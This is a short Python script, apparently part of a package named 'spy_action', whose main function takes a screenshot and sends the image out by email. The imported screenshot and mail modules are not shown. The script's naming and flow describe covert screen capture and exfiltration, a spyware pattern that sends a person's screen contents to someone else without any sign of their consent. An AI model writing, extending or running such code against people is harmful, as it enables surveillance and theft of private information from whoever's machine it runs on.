from spy_action.mail import send_mail
from spy_action.screenshot import take_screenshot


def screen_catcher():
    image = take_screenshot()
    send_mail(image["path"])


if __name__ == "__main__":
    screen_catcher()
